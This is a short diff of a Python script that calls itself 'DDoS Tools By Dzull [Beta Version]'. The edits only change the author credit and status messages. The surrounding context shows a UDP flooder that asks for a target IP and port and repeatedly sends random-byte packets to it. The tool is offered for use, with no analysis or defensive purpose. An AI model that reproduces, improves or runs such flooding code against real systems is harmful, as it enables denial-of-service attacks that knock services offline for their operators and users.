@@ -7,7 +7,7 @@ import threading
 import os
 
 os.system("clear")
-print("DDoS Tools By Yoooo [Beta Version]")
+print("DDoS Tools By Dzull [Beta Version]")
 print("Bismilah Tembus")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
@@ -23,9 +23,9 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +" | Send!!!|")
+      print(i +" | Send!!!|By Dzull#8839")
     except:
-      print("[!] | Send!!! |")
+      print("[!] | Send!!!|By Dzull#8839")
 
 def run2():
   data = random._urandom(16)
